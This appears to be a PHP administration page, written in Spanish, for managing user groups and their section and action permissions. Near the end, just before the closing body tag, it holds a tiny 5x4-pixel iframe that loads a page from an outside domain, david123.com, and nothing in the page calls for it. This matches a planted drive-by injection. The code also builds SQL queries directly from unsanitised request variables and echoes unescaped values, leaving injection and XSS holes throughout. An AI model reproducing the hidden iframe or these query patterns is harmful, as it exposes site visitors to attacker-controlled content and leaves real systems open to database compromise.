<?
        include_once('../inc/conf.inc.php');

		$grupos = new DBI;
		$resultados = new DBI;
		$resultados_tmp = new DBI;
?>
<html>
<head>
	<title>Grupos</title>
	<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
	<link rel="stylesheet" href="../<?php echo CFG_styleDir.CFG_styleFile?>" type="text/css">
    <link rel="stylesheet" href="../styles/tabla.css" type="text/css">
	<script src="<?=CFG_jsPath?>download.php"></script>
</head>

<body id="body">
<?
	if ($accion=='Permisos') {
		$grupos->delete(CFG_privilegesTable,"id_grupo=$id");
		$permisos=substr($permisos, 0, -1);
		$permisos=split(",", $permisos);
		unset($array_tuplas);
		for($cont=0; $cont < count($permisos); $cont++){
			$grupos->query( "INSERT INTO ".CFG_privilegesTable." ( id_seccion, id_grupo ) VALUES ( $permisos[$cont] , $id )" , 1);
		}
		$grupos->select(
			CFG_sectionsTable." s
			LEFT JOIN ".CFG_privilegesTable." p ON p.id_seccion = s.id",
			"DISTINCT s.id_padre",
			"p.id_grupo = $id"
		);
/*		$grupos->sql="
			SELECT DISTINCT s.id_padre
			FROM ".CFG_sectionsTable." s
			LEFT JOIN ".CFG_privilegesTable." p ON p.id_seccion=s.id
			WHERE p.id_grupo=$id
		";
		$grupos->query();*/
		$permisos='';
		while( $resultado = $grupos->fetch_object() ) {
			$permisos[] = $resultado->id_padre;
		}
		for ( $cont=0; $cont < count($permisos); $cont++ ) {
			$grupos->query( "INSERT INTO ".CFG_privilegesTable." ( id_seccion, id_grupo ) VALUES ( $permisos[$cont], $id )",1);
		}
		$accion = '';
		$action2 = 'actualizar_menu';
	}
	if ($accion=='Acciones') {
		$srv = "acciones";
		$db->delete(CFG_privilegesTable,"id_grupo = $id_grupo AND id_seccion = $id_seccion AND accion != ''");
		if (is_array( ${'arr_'.$srv} )) {
			foreach( ${'arr_'.$srv} as $accion => $nombre ){
				$db->insert(CFG_privilegesTable,"id_grupo,id_seccion,accion");
			}
		}
		$accion = '';
		$action2 = 'actualizar_menu';
	}
	if($accion=='Agregar'){
		$grupos->insert( CFG_groupsTable, 'nombre,nota,limitado' );
		$accion='';
		$action2 = 'actualizar_menu';
	}
	if($accion=='Modificar'){
		$grupos->update( CFG_groupsTable , 'nombre,nota,limitado' , "id=$id" );
		$accion='';
		$action2 = 'actualizar_menu';
	}
	if($accion=='Borrar'){
		$grupos->delete( CFG_groupsTable , "id=$id" );
		$accion='';
		$action2 = 'actualizar_menu';
	}
?>
<?
	if($accion==''){
		$permisos = new DBI;
		$grupo = $grupos->query("select * from ".CFG_groupsTable." order by nombre",1);
		$num_grupos = $grupos->num_rows();
?>
	<script>
		var item_abierto='';
		function abrir_item(n_item) {
			//alert("abrir: "+n_item);
			cerrar_item(item_abierto);
			eval('boton=document.getElementById("boton_'+n_item+'")');
			eval('lista=document.getElementById("lista_'+n_item+'")');
			boton.style.display = 'none';
			lista.style.display = 'block';
			item_abierto = n_item;
		}
		function cerrar_item(n_item){
			//alert("cerrar: "+n_item);
			if (n_item != '') {
				eval('boton=document.getElementById("boton_'+n_item+'")');
				eval('lista=document.getElementById("lista_'+n_item+'")');
				lista.style.display = 'none';
				boton.style.display = 'block';
				item_abierto = '';
				document.getElementById('body').style.display='none';
				document.getElementById('body').style.display='block';
			}
		}
	</script>
	<table align="center" width="98%" cellpadding="3" cellspacing="0" border="0">
		<tr>
			<th colspan="7" class="relieve">
				<table width="100%" border="0" cellspacing="0" cellpadding="0">
					<tr>
						<td><a href="<?=$PHP_SELF?>?accion=form_agregar" class="relieve">Agregar Grupo</a></td>
						<td align="right" class="text"><strong>Total:<?=$num_grupos?></strong>&nbsp;</td>
					</tr>
				</table>
			</th>
		</tr>
		<tr>
			<td height="5" colspan="7" class="sombra_titulo"></td>
		</tr>
		<tr align="center">
			<th class="relieve" width="15%">Nombre</th>
			<th class="relieve" width="28%">Lista de Permisos</th>
			<th class="relieve" width="5%">Limit.</th>
			<th class="relieve" width="29%">Nota</th>
			<th class="relieve" width="8%">Permisos</th>
			<th class="relieve" width="8%">Modificar</th>
			<th class="relieve" width="7%">Borrar</th>
		</tr>
<?
			if($num_grupos < 1){
?>
		<tr>
			<td colspan="7" align="center" class="relieve"><font color="#000000">Ningún registro</font></td>
		</tr>
<?
			} else {
				$grupos->query("SELECT * FROM ".CFG_groupsTable." ORDER BY nombre");
				$n = -1;
				while( $grupo = $grupos->fetch_object() ){
					$n++;
					$color = ($color=='#6699CC') ? '#336699' : '#6699CC';
?>
		<tr bgcolor="<?=$color?>">
			<td class="relieve" valign="top"><a name="id<?=$grupo->id?>"></a><?=$grupo->nombre?></td>
			<td class="relieve" valign="top">
<?
					$permisos->select(
						CFG_privilegesTable." p
						LEFT JOIN ".CFG_sectionsTable." s ON s.id = p.id_seccion",
						"DISTINCT s.nombre,s.id",
						"p.id_grupo = $grupo->id AND s.id_padre <> 0",
						"s.nombre"
					);
/*					$permisos->sql="
						SELECT DISTINCT s.nombre,s.id
						FROM ".CFG_privilegesTable." p
						LEFT JOIN ".CFG_sectionsTable." s ON s.id=p.id_seccion
						WHERE p.id_grupo = $grupo->id AND s.id_padre <> 0
						ORDER BY s.nombre
					";
					$permisos->query();*/
					$lista_items = '';
					if ($permisos->num_rows() > 0) {
						$lista_items .= "Este nodo posee los siguientes items:";
						$lista_items .= '<table class="text" width="90%">';
						while ( $permiso = $permisos->fetch_object() ) {
							$lista_items .= "<tr><td>$permiso->nombre</td>";
							$lista_items .= '<td><a href="'.$PHP_SELF.'?accion=frmAcciones&nombre_grupo='.$grupo->nombre.'&id_grupo='.$grupo->id.'&seccion='.$permiso->nombre.'&id_seccion='.$permiso->id.'" class="text">acciones</a></td></tr>';
						}
						$lista_items .= "</table>";
					}
					if ($lista_items == '') {
						echo '<font color="#ff0000">Este nodo no posee items</font>';
					} else {
?> 
				<table width="100%" border="0" cellpadding="0" cellspacing="0">
					<tr id="boton_<?=$n?>">
						<td class="text"><a onMouseOver="abrir_item(<?=$n?>)">Ver Items</a></td>
					</tr>
					<tr id="lista_<?=$n?>" style="display: none">
						<td class="text"><?=$lista_items?></td>
					</tr>
				</table>
<?
				}
?>
			</td>
			<td class="relieve" valign="top" align="center">[ <?=($grupo->limitado ? 'SI' : 'NO')?> ]</td>
			<td class="relieve" valign="top"><?=$grupo->nota==''?'&nbsp;':nl2br($grupo->nota)?></td>
			<td class="relieve" align="center" valign="top">
				<a href="<?=$PHP_SELF?>?id=<?=$grupo->id?>&nombre_grupo=<?=$grupo->nombre?>&accion=form_permisos">permisos</a>
			</td>
			<td class="relieve" align="center" valign="top"><a href="<?=$PHP_SELF?>?id=<?=$grupo->id?>&accion=form_modificar"><img src="<?=CFG_imgPath?>list.gif" border="0" /></a></td>
			<td class="relieve" align="center" valign="top"><a href="<?=$PHP_SELF?>?id=<?=$grupo->id?>&accion=form_borrar"><img src="<?=CFG_imgPath?>delete.gif" border="0" /></a></td>
		</tr>
<?
			}
		}
?>
	</table>
<?
	}
	if($accion=='form_agregar'){
?>
<?
		Form::validate();
?>
	<form name="form1" method="post" action="<?=$PHP_SELF?>" onSubmit="return validate(this)">
		<table width="398" border="0" cellspacing="0" cellpadding="0" align="center">
			<tr align="center">
				<th height="29" colspan="2" class="relieve1"><span class="texto_titulo">Agregar Grupo</span></th>
			</tr>
			<tr>
				<td width="172">&nbsp;</td>
				<td width="226">&nbsp;</td>
			</tr>
			<tr align="center">
				<td class="relieve">Nombre</td>
				<td class="relieve">
					<input validar="str:Debe ingresar un nombre de grupo." type="text" name="nombre">
				</td>
			</tr>
			<tr align="center">
				<td class="relieve">Nota</td>
				<td class="relieve"><textarea name="nota" wrap="VIRTUAL"></textarea></td>
			</tr>
			<tr align="center">
				<td class="relieve">Limitado a sus propios registros </td>
				<td class="relieve"><input type="checkbox" name="limitado" value="1"></td>
			</tr>
			<tr align="right">
				<td colspan="2" class="relieve">
						<input type="hidden" name="accion" value="Agregar">
						<input type="submit" class="boton" value="Agregar">&nbsp;
						<input type="button" class="boton" value="Cancelar" name="Button" onClick="javascript:location = '<?=$PHP_SELF?>#id<?=$id?>'">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
			</td>
			</tr>
		</table>
	</form>
<?
	}
	if($accion=='form_permisos'){
		$resultados->query("SELECT * FROM ".CFG_sectionsTable." WHERE id_padre= 0 AND nombre <> '-separador-' ORDER BY nombre");
?>
	<script>
		var cant=0;
		var nodos=new Array();
		function agregar_permiso(n){
			for(cont=0; eval('cont <= document.frm_permisos.d_'+n+'.length-1'); cont++){
				if(eval('document.frm_permisos.d_'+n+'.options[cont].selected') == true){
					eval('document.frm_permisos.o_'+n+'.options[document.frm_permisos.o_'+n+'.length]=new Option(document.frm_permisos.d_'+n+'.options[cont].text, document.frm_permisos.d_'+n+'.options[cont].value);');
					eval('document.frm_permisos.d_'+n+'.options[cont]=null;');
					cont--;
				}
			}
		}
		function eliminar_permiso(n){
			for(cont=0; eval('cont <= document.frm_permisos.o_'+n+'.length-1'); cont++){
				if(eval('document.frm_permisos.o_'+n+'.options[cont].selected') == true){
					eval('document.frm_permisos.d_'+n+'.options[document.frm_permisos.d_'+n+'.length]=new Option(document.frm_permisos.o_'+n+'.options[cont].text, document.frm_permisos.o_'+n+'.options[cont].value);');
					eval('document.frm_permisos.o_'+n+'.options[cont]=null;');
					cont--;
				}
			}
		}
	</script>
	<form name="frm_permisos" method="post" action="<?=$PHP_SELF?>">
		<input type="hidden" name="accion" value="Permisos">
		<input type="hidden" name="id" value="<?=$id?>">
		<table align="center" width="98%" cellpadding="3" cellspacing="0" border="0">
			<tr>
				<th class="relieve">Permisos para el grupo: <?=$nombre_grupo?></th>
			</tr>
			<tr>
				<td height="5" class="sombra_titulo"></td>
			</tr>
		</table>
		<table class="relieve" align="center" width="98%" cellpadding="3" cellspacing="0" border="0">
<?
		if ($resultados->num_rows() < 1) {
?>
			<tr>
				<td align="center">&nbsp;</td>
			</tr>
			<tr class="relieve">
				<td align="center" class="relieve">No hay nig&uacute;na secci&oacute;n habilitada.</td>
			</tr>
			<tr>
				<td align="center" class="relieve">&nbsp;</td>
			</tr>
<?
		} else {
?>
			<tr class="relieve">
				<td valign="top">&nbsp;</td>
			</tr>
<?
			$resultados_tmp->sql="
				SELECT id_seccion
				FROM ".CFG_privilegesTable."
				WHERE id_grupo = $id
			";
			$resultados_tmp->query();
			if($resultados_tmp->num_rows()>0){
				while ($resultado_tmp=$resultados_tmp->fetch_object()) {
					$permisos .= $resultado_tmp->id_seccion.', ';
				}
				$permisos = substr($permisos, 0, -2);
			}
			while ($resultado=$resultados->fetch_object()) {
				$color=($color=='#6699CC')?'#336699':'#6699CC';
?>
			<tr class="relieve">
				<td valign="top">
					<script>
						nodos[cant++]='<? echo $resultado->id?>';
					</script>
					<table class="relieve1" width="98%" align="center" border="0" cellspacing="0" cellpading="3">
						<tr>
							<th align="center" colspan="3" class="relieve">Permisos para el Nodo: <? echo $resultado->nombre?></th>
						</tr>
						<tr>
							<td height="5" class="sombra_titulo" align="center" colspan="3"></td>
						</tr>
						<tr>
							<td align="center" width="45%">Permisos disponibles<br>
								<select name="d_<? echo $resultado->id?>" size="6" multiple style="width: 98%" ondblclick="agregar_permiso(<? echo $resultado->id?>)">
<?
				$resultados_tmp->sql="
					SELECT id,nombre
					FROM ".CFG_sectionsTable."
					WHERE id_padre = $resultado->id ".($permisos == '' ? '' : 'AND id NOT IN ('.$permisos.')')."
					ORDER BY nombre
				";
				//$resultados_tmp->print_sql();																											
				$resultados_tmp->query();
				if ($resultados_tmp->num_rows()>0) {
					while ($resultado_tmp=$resultados_tmp->fetch_object()) {
?>
									<option value="<? echo $resultado_tmp->id?>"><? echo $resultado_tmp->nombre?></option>
<?
					}
				}
?>
								</select>
								<br>
							</td>
							<td align="center" width="10%">
								<input class="boton" type="button" value=" >> " onClick="agregar_permiso(<? echo $resultado->id?>)"><br>
								<br>
								<input class="boton" type="button" value=" << " onClick="eliminar_permiso(<? echo $resultado->id?>)"><br>
							</td>
							<td align="center" width="45%">Permisos otorgados<br>
								<select name="o_<? echo $resultado->id?>" size="6" multiple style="width: 98%"  ondblclick="eliminar_permiso(<? echo $resultado->id?>)">
<?
				$resultados_tmp->sql="
					SELECT id,nombre
					FROM ".CFG_sectionsTable."
					WHERE id_padre = $resultado->id ".($permisos==''?'AND 0=1':'AND id IN ('.$permisos.')')."
					ORDER BY nombre
				";
				$resultados_tmp->query($sql);
				if ($resultados_tmp->num_rows()>0) {
					while ($resultado_tmp=$resultados_tmp->fetch_object()) {
?>
									<option value="<? echo $resultado_tmp->id?>"><? echo $resultado_tmp->nombre?></option>
<?
					}
				}
?>
								</select>
								<br>
							</td>
						</tr>
					</table>
				</td>
			</tr>
<?
			}
		}
?>
			<tr class="relieve">
				<td valign="top">&nbsp;</td>
			</tr>
		</table>
		<input type="hidden" name="permisos" value="">
		<script>
			function enviar(){
				var cont;
				for (cont = 0; cont < cant; cont++) {
					if (eval('document.frm_permisos.o_'+nodos[cont]+'[0]')) {
						for (cont2 = 0; eval('cont2<=document.frm_permisos.o_'+nodos[cont]+'.length-1') ; cont2++) {
							eval("document.frm_permisos.permisos.value+=document.frm_permisos.o_"+nodos[cont]+".options[cont2].value+',';");
						}
					}
				}
				document.frm_permisos.submit();
			}
		</script>
	</form>
	<p align="center"><input class="boton" type="button" value="Aceptar" onClick="javascript:enviar()">&nbsp;<input type="button" value="Cancelar" class="boton" onClick="location = '<?=$PHP_SELF?>'" /></p><br>
<?
	}//end form_permisos




	if ($accion=='frmAcciones') {
?>
<script language="JavaScript" type="text/javascript">
	var cant=0;
	var nodos = new Array();
	function mover_elemento(origen,destino){
		for(cont = 0; eval('cont <= origen.length-1'); cont++){
			if(eval('origen.options[cont].selected') == true){
				eval('destino.options[destino.length]=new Option(origen.options[cont].text, origen.options[cont].value);');
				eval('origen.options[cont]=null;');
				cont--;
			}
		}
	}
</script>
<?
		$resultados->query("
			SELECT *
			FROM ".CFG_actionsTable."
			WHERE padre = ''
			ORDER BY nombre
		");
?>
	<form name="frm_acciones" method="post" action="<?=$PHP_SELF?>">
		<input type="hidden" name="accion" value="Acciones">
		<input type="hidden" name="id" value="<?=$id?>">
		<input type="hidden" name="id_grupo" value="<?=$id_grupo?>" />
		<input type="hidden" name="id_seccion" value="<?=$id_seccion?>" />
		<table align="center" width="80%" cellpadding="3" cellspacing="0" border="0">
			<tr>
				<th class="relieve">Permisos para el grupo: <?=$nombre_grupo?></th>
			</tr>
			<tr>
				<td height="5" class="sombra_titulo"></td>
			</tr>
		</table>
		<table width="80%" align="center">
			<tr>
				<td class="relieve" width="20%"><?=$seccion?></td>
				<td class="relieve" align="center">
						<table border="0" cellpadding="0" cellspacing="0" width="95%">
							<tr>
								<td width="45%" class="text">Disponibles: 
<?
				$srv = 'acciones';
				$registros_tmp = new DBI;
				$registros_tmp->select(
					CFG_privilegesTable,
					"*",
					"id_grupo = $id_grupo AND id_seccion = $id_seccion AND accion != ''",
					"accion"
				);
//				$registros_tmp->print_sql();
				$seleccionados = '';
				while ($resultado = $registros_tmp->fetch_object()) {
					$seleccionados .= ($seleccionados == '' ? '' : ',')."'".$resultado->accion."'";
				}
				$registros_tmp->select(
					CFG_sections_actionsTable,
					'*',
					"id_seccion = $id_seccion".($seleccionados == '' ? "" : " AND accion NOT IN ($seleccionados)"),
					'accion'
				);
//				$registros_tmp->print_sql();
?>
				  <select name="<?=$srv?>_disponibles" id="<?=$srv?>_dsiponibles" size="6" multiple style="width: 98%" ondblclick="mover_elemento(this,document.frm_acciones.<?=$srv?>_sel)">
<?
				if ($registros_tmp->num_rows() > 0) {
					while ($registro_tmp = $registros_tmp->fetch_object()) {
?>
					<option value="<?=$registro_tmp->accion?>"><?=$registro_tmp->accion?></option>
<?
					}
				}
?>
				  </select></td>
								<td align="center" width="10%">
									<input type="button" class="button2" value=">>" onClick="mover_elemento(document.frm_acciones.<?=$srv?>_disponibles,document.frm_acciones.<?=$srv?>_sel)"><br>
									<br>
									<input type="button" class="button2" value="<<" onClick="mover_elemento(document.frm_acciones.<?=$srv?>_sel,document.frm_acciones.<?=$srv?>_disponibles)"><br>
								</td>
								<td width="45%" class="text">Seleccionados:
									<select name="<?=$srv?>_sel[]" id="<?=$srv?>_sel" size="6" multiple style="width: 98%"  ondblclick="mover_elemento(this,document.frm_acciones.<?=$srv?>_disponibles)">
<?
				if ($seleccionados != '') {
					$registros_tmp->select(
						CFG_actionsTable,
						'*',
						$seleccionados == '' ? "" : "nombre IN ($seleccionados)",
						'nombre'
					);
					if ($registros_tmp->num_rows() > 0) {
						while ($registro_tmp = $registros_tmp->fetch_object()) {
?>
										<option value="<?=$registro_tmp->nombre?>"><?=$registro_tmp->nombre?></option>
<?
						}
					}
				}
?>
									</select>
								</td>
							</tr>
							<tr height="5">
								<td></td>
								<td></td>
								<td></td>
							</tr>
						</table>
				</td>
			</tr>
		</table>
		<input type="hidden" name="permisos" value="">
	</form>
		<script>
			function seleccionar() {
				var elem;
				for (var cont = 0 ; cont <= document.frm_acciones.<?=$srv?>_sel.length-1 ; cont++) {
					document.frm_acciones.<?=$srv?>_sel.options[cont].selected = true;
					elem = document.createElement('<INPUT TYPE="hidden" name="arr_<?=$srv?>['+document.frm_acciones.<?=$srv?>_sel.options[cont].value+']" value="'+document.frm_acciones.<?=$srv?>_sel.options[cont].value+'" />');
					document.frm_acciones.insertBefore(elem);
				}
				document.frm_acciones.submit();
			}
			function enviar(){
				var cont;
				for (cont = 0; cont < cant; cont++) {
					if (eval('document.frm_acciones.o_'+nodos[cont]+'[0]')) {
						for (cont2 = 0; eval('cont2<=document.frm_acciones.o_'+nodos[cont]+'.length-1') ; cont2++) {
							eval("document.frm_acciones.permisos.value+=document.frm_acciones.o_"+nodos[cont]+".options[cont2].value+',';");
						}
					}
				}
				document.frm_permisos.submit();
			}
		</script>
	<p align="center"><input class="boton" type="button" value="Aceptar" onClick="javascript:seleccionar()">&nbsp;<input type="button" value="Cancelar" class="boton" onClick="location = '<?=$PHP_SELF?>'" /></p><br>
<?
	}//end frmAcciones
?>
<?
	if ($accion == 'form_modificar') {
		$grupo= DBI::record(CFG_groupsTable,"id=$id");
?>
<?
		Form::validate();
?>
	<form name="form1" method="post" action="<? echo $PHP_SELF?>" onSubmit="return validate(this)">
		<table width="398" border="0" cellspacing="0" cellpadding="0" align="center">
			<tr align="center">
				<th class="relieve" height="30" colspan="2"><span class="texto_titulo">Modificar Grupo</span></th>
			</tr>
			<tr align="center">
				<td class="relieve" width="200">Nombre</td>
				<td class="relieve">
					<input validar="str:Debe ingresar un nombre de grupo." type="text" name="nombre" value="<?=$grupo->nombre?>">
				</td>
			</tr>
			<tr align="center">
				<td width="200" class="relieve">Nota</td>
				<td class="relieve"><textarea name="nota" wrap="VIRTUAL"><? echo $grupo->nota?></textarea></td>
			</tr>
			<tr align="center">
				<td width="172" class="relieve">Limitado a sus propios registros </td>
				<td width="226" class="relieve">
					<input type="checkbox" name="limitado" value="1" <? echo  ( $grupo->limitado ? 'checked' : '' )?>>
				</td>
			</tr>
			<tr align="center">
				<td colspan="2" class="relieve" align="center">
					<input type="hidden" name="id" value="<?=$id?>">
					<input type="hidden" name="accion" value="Modificar">
					<input type="submit" class="boton" value="Modificar">
					<input type="button" class="boton" value="Cancelar" name="Button" onClick="void open('<?=$PHP_SELF?>','_self','')">
				</td>
			</tr>
		</table>
	</form>
<?
	}
	if($accion=='form_borrar'){
		$grupo= DBI::record(CFG_groupsTable,"id=$id");
?>
	<form name="form1" method="post" action="<?=$PHP_SELF?>">
		<table width="398" border="0" cellspacing="0" cellpadding="2" align="center">
			<tr align="center">
				<th class="relieve" height="31" colspan="2"><span class="texto_titulo">Borrar Grupo </span></th>
			</tr>
			<tr align="center">
				<td class="relieve" width="199">Nombre</td>
				<td class="relieve" width="199">&nbsp;<?=$grupo->nombre?></td>
			</tr>
			<tr align="center">
				<td width="188" align="center" class="relieve">Nota</td>
				<td width="210" class="relieve" align="left">&nbsp;<?=nl2br($grupo->nota)?></td>
			</tr>
			<tr align="center">
				<td width="172" class="relieve">Limitado a sus propios registros</td>
				<td width="226" class="relieve">[ <?=( $grupo->limitado ? 'SI' : 'NO' )?> ]</td>
			</tr>
			<tr align="center">
				<td colspan="2" class="relieve" align="center">
						<input type="hidden" name="id" value="<?=$id?>">
						<input type="submit" class="boton" value="Borrar" name="accion">
						<input type="button" class="boton" value="Cancelar" name="Button" onClick="javascript:location = '<? echo $PHP_SELF?>'">
				</td>
			</tr>
		</table>
	</form>
<?
	}
?>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</html>
<?php
	if ($action2 == 'actualizar_menu') {
?>
	<script language="JavaScript" type="text/javascript">
	<!--
		download ('menu.php' , function (s){ top.document.getElementById ('menu').innerHTML = s});
	//-->
	</script>
<?php
		$action2 = '';
	}
?>
